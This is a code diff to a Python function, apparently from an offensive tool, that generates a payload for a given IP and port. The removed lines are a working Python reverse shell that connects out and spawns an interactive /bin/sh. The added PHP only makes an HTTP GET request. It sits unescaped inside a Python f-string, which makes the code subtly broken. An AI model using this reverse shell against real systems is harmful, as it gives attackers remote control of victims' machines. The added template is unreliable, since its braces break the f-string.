@@ -5,9 +5,24 @@ import argparse
 
 def generate_payload(ip, port):
     payload = f"""
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));
-os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
+<?php
+$ip = '{ip}';
+$port = {port};
+$fp = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$fp) {
+    echo "$errstr ($errno)<br />\n";
+} else {
+    $out = "GET / HTTP/1.1\r\n";
+    $out .= "Host: $ip\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($fp, $out);
+    while (!feof($fp)) {
+        $in = fgets($fp, 128);
+        echo $in;
+    }
+    fclose($fp);
+}
+?>
 """
     return payload
 
